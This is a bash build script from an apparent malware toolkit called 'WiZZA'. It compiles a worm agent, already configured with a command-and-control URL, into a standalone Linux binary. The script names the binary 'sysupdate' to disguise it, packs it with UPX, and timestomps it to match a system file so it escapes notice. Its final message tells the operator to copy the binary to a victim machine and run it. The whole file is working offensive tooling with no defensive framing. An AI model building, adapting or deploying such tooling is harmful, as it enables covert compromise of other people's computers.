#!/bin/bash
# ── WiZZA Binary Build — PyInstaller + UPX ───────────────────────────────────
# Compiles the baked worm_agent.py to a standalone binary.
# Run AFTER bash start (mode 4) has baked the payload with a C2 URL.
# Output: op/payloads/worm_linux  (Linux x86_64, no Python needed)
#
# Usage: bash build.sh [payload_dir]
# Default payload_dir: op/payloads

set -e
OP="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/op"
PAYLOAD_DIR="${1:-$OP/payloads}"
SRC="$PAYLOAD_DIR/worm_agent.py"
OUT_DIR="$PAYLOAD_DIR/dist"

R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; C='\033[0;36m'; W='\033[1;37m'; N='\033[0m'
ok()   { echo -e "  ${G}✓${N} $*"; }
info() { echo -e "  ${C}→${N} $*"; }
err()  { echo -e "  ${R}✗${N} $*" >&2; }

echo ""
echo -e "${C}  ╔══════════════════════════════════════════════╗"
echo -e "  ║        WiZZA Binary Builder                 ║"
echo -e "  ╚══════════════════════════════════════════════╝${N}"
echo ""

# ── Pre-flight checks ─────────────────────────────────────────────────────────
[ -f "$SRC" ] || { err "No baked worm found at $SRC — run bash start first"; exit 1; }

# Ensure pyinstaller is available
if ! python3 -m PyInstaller --version &>/dev/null; then
    info "Installing PyInstaller..."
    pip3 install --quiet pyinstaller 2>/dev/null || \
    pip install --quiet pyinstaller 2>/dev/null || \
    { err "PyInstaller install failed — run: pip3 install pyinstaller"; exit 1; }
fi
ok "PyInstaller: $(python3 -m PyInstaller --version 2>/dev/null)"

# Check UPX
UPX_ARGS=""
if command -v upx &>/dev/null; then
    ok "UPX: $(upx --version 2>/dev/null | head -1)"
    UPX_ARGS="--upx-dir $(dirname $(which upx))"
else
    info "UPX not found — skipping packing (install: apt install upx)"
fi

# ── Build ─────────────────────────────────────────────────────────────────────
echo ""
info "Compiling $SRC → binary..."
mkdir -p "$OUT_DIR"

python3 -m PyInstaller \
    --onefile \
    --noconsole \
    --name "sysupdate" \
    --distpath "$OUT_DIR" \
    --workpath "/tmp/pyi_build_$$" \
    --specpath "/tmp/pyi_spec_$$" \
    --hidden-import=ctypes \
    --hidden-import=ctypes.wintypes \
    --hidden-import=hashlib \
    --hidden-import=base64 \
    --hidden-import=ssl \
    --strip \
    $UPX_ARGS \
    --log-level WARN \
    "$SRC"

rm -rf "/tmp/pyi_build_$$" "/tmp/pyi_spec_$$"

BIN="$OUT_DIR/sysupdate"
[ -f "$BIN" ] || { err "Build failed — check PyInstaller output"; exit 1; }

SIZE=$(du -sh "$BIN" | cut -f1)
ok "Binary: $BIN  ($SIZE)"

# ── Pack with UPX if available ────────────────────────────────────────────────
if command -v upx &>/dev/null; then
    info "Packing with UPX..."
    upx --best --quiet "$BIN" 2>/dev/null && \
        ok "UPX packed: $(du -sh "$BIN" | cut -f1)  (down from $SIZE)" || \
        info "UPX skipped (binary may already be packed)"
fi

# ── Timestomp ─────────────────────────────────────────────────────────────────
# Set mtime to match a system file so it doesn't stand out in ls -la
python3 -c "
import os,shutil
ref='/usr/bin/python3'
if os.path.exists(ref):
    st=os.stat(ref); os.utime('$BIN',(st.st_atime,st.st_mtime))
    print('  timestomped to match',ref)
" 2>/dev/null

echo ""
echo -e "  ${G}★ BUILD COMPLETE${N}"
echo -e "  Binary:  ${W}$BIN${N}"
echo -e "  Deploy:  copy to victim machine and execute"
echo -e "  Windows: cross-compile with Wine+PyInstaller or use worm_agent.ps1"
echo ""
